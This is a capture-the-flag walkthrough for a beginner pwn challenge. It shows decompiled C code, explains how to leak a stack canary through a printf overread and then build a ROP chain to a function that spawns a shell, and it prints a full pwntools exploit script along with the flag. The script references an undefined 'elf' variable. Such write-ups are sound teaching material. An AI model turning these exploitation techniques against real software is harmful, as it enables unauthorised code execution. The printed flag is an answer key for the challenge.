---
linkTitle: Escape the Room
title: Beginner - Escape the Room
type: docs
---

* Author: P3g4su5    
* Difficulty: Easy
* Description : You have limited tries, try to maximize you knowledge with every try, if you feel hungry there are some cookies kept near the stack of papers
* Attachments : [escape_the_room.zip](https://github.com/Parth-Badgujar/BackdoorCTF-23-Pwn/raw/main/Escape%20The%20Room/public/escape-the-room.zip)  

## Walkthrough

* This one was a ROP challenge with `stack canaries` enebled, and `PIE` disabled. The goal was to first leak the canary and then perform ROP to `escape` function. 
* I also gave a slight hint about canary in the description if you read carefully 

* Here is the decompiled code by IDA 

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char buf[32]; // [rsp+0h] [rbp-50h] BYREF
  char s1[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  v3 = time(0LL);
  srand(v3);
  rand_str(s1, 30LL);
  puts("Welcome to Escape the R00m !");
  puts("You have only two chances to escape the room ...");
  printf("Enter key : ");
  read(0, buf, 0x50uLL);
  if ( !strncmp(s1, buf, 0x1EuLL) )
    puts("That was a nice escape ... But there is more to it !");
  else
    printf("%s is not the key, try again !\n", buf);
  printf("Enter key : ");
  __isoc99_scanf("%s", buf);
  if ( !strncmp(s1, buf, 0x1EuLL) )
    puts("That was a nice escape ... But there is more to it !");
  else
    puts("Wrong, go away !");
  return 0;
}

int escape()
{
  puts("Sweet !");
  return system("/bin/sh");
}
```

* The program asks for a `key` and matches it with randomly generated key, we can predict the randomly generated key since it is using `srand(time(0))` but this is not the goal
* Given two chances, the goal is to leak the `canary` from first input and `overflow the return address` from the second input as both of them are using `scanf("%s", buf)` format specifier to read input.  

### Leaking Canary (first input) 

* `printf("%s", buf)` or `puts(buf)` both will print characters untill they encounter a `null byte`.
* The actual `canary` is also stored on the `stack` at the bottom, so if we give an input such that its length reaches upto the `canary` in the stack, along with overwriting null byte of the `canary`, it will print out input along with the `canary` in the `printf` call as there is no null byte between our input and canary.   
* You can calculate the offset where the input overwrites the canary and it turns out to be `0x48` 

### ROP (second input) 

* Now we had to perform a simple `ROP` at the same time placing `canary` at specific posision in the `stack` such that it properly matches the comparison operators at the end of stack and overwrite return address to address of `escape` function.
* Due to `stack allignment` issue we will have to add an extra `ret` instruction gadget before the address of `escape` function 

### Exploit 

Here is the complete exploit : 
```python
from pwn import * 

p = process('./chal')

#First input 
p.sendlineafter("key : ", cyclic(0x48))

canary = p.recvuntil('try again !').split(b' ')[0].lstrip(cyclic(0x48))

canary = u64(b'\00' + canary[1:-1])

log.critical(f"Canary : {hex(canary)}")


#Second Input
ret = p64(0x000000000040101a)

p.sendlineafter("key : ", cyclic(72) + p64(canary) + p64(0) + ret + p64(elf.sym['escape']))

p.interactive()
``` 
<br>
---

##### Flag : `flag{unl0ck_y0ur_1m4gin4ti0ns_esc4p3_th3_r00m_0f_l1m1t4t10n5}`



